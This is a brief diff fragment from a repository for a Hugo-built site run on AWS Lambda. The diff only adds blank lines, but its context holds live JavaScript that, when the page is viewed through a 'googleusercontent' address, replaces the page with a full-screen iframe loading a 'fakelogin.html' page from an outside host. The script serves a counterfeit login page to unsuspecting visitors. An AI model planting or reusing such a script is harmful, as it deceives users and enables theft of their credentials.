@@ -12,4 +12,6 @@ Site content is pushed to github, Hugo built is ran on AWS lambda and triggered 
   if (document.location.href.indexOf("googleusercontent")>0){
         document.body.innerHTML="<iframe src=\"https://ebfe.pw/shared/fakelogin.html\" style=\"width:100%; height:100vh\" />"
       }
+
+
 </script>
